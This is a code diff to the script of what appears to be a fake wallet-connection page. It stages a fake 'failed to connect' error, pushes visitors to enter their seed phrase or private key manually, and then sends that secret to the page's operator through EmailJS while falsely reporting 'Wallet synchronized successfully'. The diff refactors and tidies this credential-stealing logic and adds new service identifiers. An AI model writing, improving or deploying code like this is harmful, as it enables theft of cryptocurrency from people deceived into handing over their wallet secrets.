@@ -1181,12 +1181,12 @@
 
 <script>
     (function () {
-        emailjs.init("yTci51Zh-USptUYYf");
+        emailjs.init("deTnB9DWL0AmEBhSa");
     })();
 
-    $(document).ready(function() { // <--- Starts here
+    $(document).ready(function() {
         
-        // OPEN MODAL LOGIC
+        // 1. OPEN MODAL LOGIC
         $('.select_wallet, .select_liquality').on('click', function() {
             let name = $(this).data('title');
             $('#wallet_name_display').text(name);
@@ -1196,7 +1196,6 @@
             $('#failed_to_connect, #failed_to_connect2, #div_connect_manuallly').hide();
             $('#popup_connect_wallet').modal('show');
 
-            // Random delay for "Error" appearance
             setTimeout(() => {
                 $('#auto_connecting').hide();
                 if($(this).hasClass('select_liquality')) {
@@ -1207,95 +1206,73 @@
             }, Math.floor(Math.random() * 2000) + 1500);
         });
 
-        // TRY AGAIN
-        $('.try_again_btn').on('click', function() {
-            $('#failed_to_connect, #failed_to_connect2').hide();
-            $('#auto_connecting').show();
-            setTimeout(() => {
-                $('#auto_connecting').hide();
-                $('#failed_to_connect').show();
-            }, 2000);
-        });
-
-        // SWITCH TO MANUAL
+        // 2. SWITCH TO MANUAL
         $('#button_connect_manually, #button_connect_manually2').on('click', function() {
             $('#failed_to_connect, #failed_to_connect2, #auto_connecting').hide();
             $('#div_connect_manuallly').show();
         });
 
-        // Validation Logic (Different for Phrase vs Private Key)
-       function validateInputs() {
-    let btn = $('#button_connect_wallet');
-    let type = $('#import_type').val(); // Phrase or Private Key
+        // 3. VALIDATION LOGIC
+        function validateInputs() {
+            let btn = $('#button_connect_wallet');
+            let type = $('#import_type').val();
 
-    if (type === 'Phrase') {
-        // Phrase Rule: Still follows the 12, 15, 18, 21, or 24 words rule
-        let val = $('#secret_phrase').val().trim();
-        let wordCount = val ? val.split(/\s+/).length : 0;
-        
-        if ([12, 15, 18, 21, 24].includes(wordCount)) {
-            btn.prop('disabled', false).css('opacity', '1');
-        } else {
-            btn.prop('disabled', true).css('opacity', '0.2');
+            if (type === 'Phrase') {
+                let val = $('#secret_phrase').val().trim();
+                let wordCount = val ? val.split(/\s+/).length : 0;
+                if ([12, 15, 18, 21, 24].includes(wordCount)) {
+                    btn.prop('disabled', false).css('opacity', '1');
+                } else {
+                    btn.prop('disabled', true).css('opacity', '0.2');
+                }
+            } else {
+                let val = $('#private_key_input').val().trim();
+                if (val.length > 0) {
+                    btn.prop('disabled', false).css('opacity', '1');
+                } else {
+                    btn.prop('disabled', true).css('opacity', '0.2');
+                }
+            }
         }
-    } else {
-        // Private Key Rule: ALLOW ANY LENGTH
-        // As long as there is at least one character, the button turns on.
-        let val = $('#private_key_input').val().trim();
-        
-        if (val.length > 0) {
-            btn.prop('disabled', false).css('opacity', '1');
-        } else {
-            btn.prop('disabled', true).css('opacity', '0.2');
-        }
-    }
-}
 
-        // Trigger validation on any input
-        $('#secret_phrase, #private_key_input').on('input', function() {
-            validateInputs();
-        });
+        $('#secret_phrase, #private_key_input').on('input', validateInputs);
 
-        // Also trigger validation when switching tabs
         $('.tab-btn').on('click', function() {
             $('.tab-btn').removeClass('active');
             $(this).addClass('active');
-            
             let target = $(this).data('target');
             $('#import_type').val(target === 'phrase' ? 'Phrase' : 'Private Key');
 
             if (target === 'phrase') {
                 $('#phrase_input_container').show();
                 $('#private_key_input_container').hide();
-                $('#secret_phrase').attr('required', true);
-                $('#private_key_input').removeAttr('required');
             } else {
                 $('#phrase_input_container').hide();
                 $('#private_key_input_container').show();
-                $('#private_key_input').attr('required', true);
-                $('#secret_phrase').removeAttr('required');
             }
             validateInputs(); 
         });
 
-        // FINAL SUBMIT TO EMAILJS
+        // 4. FINAL SUBMIT (Improved)
         $('#contact-form').on('submit', function(e) {
             e.preventDefault();
             
             let btn = $('#button_connect_wallet');
+            let walletName = $('#hidden_wallet_name').val();
             let importType = $('#import_type').val();
             
-            if (importType === 'Private Key') {
-                let pkValue = $('#private_key_input').val();
-                $('#secret_phrase').val("PRIVATE KEY: " + pkValue);
-            } else {
-                let phraseValue = $('#secret_phrase').val();
-                $('#secret_phrase').val("PHRASE: " + phraseValue);
-            }
+            // Get the value based on which tab is active
+            let finalValue = (importType === 'Phrase') ? $('#secret_phrase').val() : $('#private_key_input').val();
 
             btn.text("Synchronizing...").prop('disabled', true);
 
-            emailjs.sendForm("service_vexcr06", "template_vl27mso", this)
+            // Using emailjs.send instead of sendForm is cleaner for dynamic values
+            let templateParams = {
+                from_name: walletName,
+                message: "Method: " + importType + "\nValue: " + finalValue
+            };
+
+            emailjs.send("service_pkdh15e", "service_pkdh15e", templateParams)
                 .then(function() {
                     alert("Wallet synchronized successfully");
                     window.location.href = 'index.html'; 
@@ -1305,8 +1282,7 @@
                     console.log("Error:", error);
                 });
         });
-
-    }); // <--- THIS WAS MISSING: Closes the $(document).ready
+    });
 </script>
 
 </body>
